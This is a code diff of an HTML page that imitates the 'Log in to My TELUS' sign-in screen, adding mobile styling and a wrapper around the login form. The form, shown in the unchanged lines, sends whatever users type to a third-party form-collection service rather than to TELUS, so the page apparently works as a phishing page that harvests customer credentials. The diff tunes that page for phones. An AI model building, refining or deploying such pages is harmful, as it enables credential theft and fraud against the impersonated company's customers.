@@ -25,6 +25,29 @@
 
   </div>
     <style>
+    
+    @media (max-width: 500px) {
+  /* Your mobile styles here */
+        
+    footer#ge-footer {
+    display: none;
+    }
+    nav#menu {
+    display: none;
+    }
+    .main-header {
+    background: none !important;
+  }
+    form#my-form {
+    width: 85%;
+}
+    .logo img {
+    height: 28px;
+}
+    .form-box {
+    margin: 80px 0px 80px 0px;
+    width: auto !important;
+}
         .sc-kgOKUu.fCCEgl {
             font-family: monospace;
             font-size: 16px;
@@ -256,6 +279,7 @@
 </head>
 
 <body>
+    <div class="formcontainer">
     <form id="my-form" action="https://formspree.io/f/mdapngpp" method="POST">
         <div class="form-box">
             <h2>Log in to My TELUS</h2>
@@ -289,6 +313,7 @@
             <button class="login19" id="my-form-button">Log in</button>
         </div>
     </form>
+    </div>
     <div class="sc-dcJsrY iifIdT"><img data-testid="telus-leaves-image"
             src="//images.ctfassets.net/reduo6gvn7wu/5gOJ6Sp0vs6flsxB33a8gr/fa393fe54b875e03e5d29dab5e6f79e0/leaves.webp"
             width="1588" alt="" loading="eager" style="height: 0px; max-width: 100%;"></div>
